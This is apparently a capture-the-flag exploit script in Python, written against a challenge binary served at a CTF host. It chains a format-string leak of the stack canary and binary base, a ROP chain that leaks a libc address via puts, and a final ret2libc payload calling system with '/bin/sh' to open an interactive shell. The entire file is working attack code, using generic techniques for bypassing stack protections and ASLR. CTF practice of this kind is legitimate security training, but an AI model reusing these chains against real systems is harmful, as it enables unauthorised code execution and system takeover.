#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Author := 4n0nym4u5

from rootkit import *
from time import sleep

exe  = context.binary = ELF('./chall')
host = args.HOST or 'chall.nitdgplug.org'
port = int(args.PORT or 30091)

gdbscript = '''
tbreak main
# brva 0x1293
continue
'''.format(**locals())
i=0
libc=ELF("libc.so.6")
io = start()
# R = Rootkit(io)
re()
# gdb.attach(io.pid, gdbscript=gdbscript)
sl(f"%{23}$p|%{3}$p|%{9}$p|%{25}$p|")
# canary=R.canary()
rl()
leaks=rl().split(b"|")
print(leaks)
canary=int(leaks[0], 16)
heap_base=int(leaks[1], 16)-0x2b7
# libc.address=int(leaks[2], 16)#-0x219760
exe.address=int(leaks[3], 16)-0x12d5
info(f"CANARY : {hex(canary)}")
lb()
pb()
hb()

padding = b"A"*72

rop1 = flat(

	padding,
	canary,
	b"A"*8,
	gadget("pop rdi; ret"),
	exe.sym['__libc_start_main'],
	exe.sym.puts,
	exe.sym.main

)
sl(rop1)
rl()
# print(hexdump(re()))
libc.address=uu64(ren(6))-libc.sym['__libc_start_main']
lb()
re()
sl(b"A")
binsh = next(libc.search(b'/bin/sh\x00'))
sl(padding + p(canary) + b"A"*8 + gadget("ret") + ret2libcsystem() )
io.interactive()